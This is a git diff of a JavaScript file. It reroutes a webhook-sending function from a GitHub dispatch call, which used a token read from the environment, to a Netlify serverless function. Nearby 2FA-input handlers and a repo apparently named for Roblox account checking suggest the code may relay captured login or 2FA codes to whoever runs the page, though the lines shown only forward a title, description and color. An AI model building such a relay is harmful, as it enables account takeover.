@@ -298,27 +298,14 @@ if (twofaInput2 && verifyButton2) {
   });
 }
 
-// === Secure Webhook Sending (Server-Side) ===
 async function sendSecureWebhook(title, description, color) {
   try {
-    // Use GitHub API to trigger the webhook handler
-    const response = await fetch('https://api.github.com/repos/froosterton/rbxchecking/dispatches', {
+    const response = await fetch('/.netlify/functions/webhook', {
       method: 'POST',
-      headers: {
-        'Accept': 'application/vnd.github.v3+json',
-        'Authorization': `token ${process.env.WEBHOOK_GITHUB_TOKEN}`,
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        event_type: 'webhook_request',
-        client_payload: {
-          title: title,
-          description: description,
-          color: color
-        }
-      })
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ title, description, color })
     });
-
+    
     if (!response.ok) {
       console.error('Failed to send webhook:', response.status);
     }
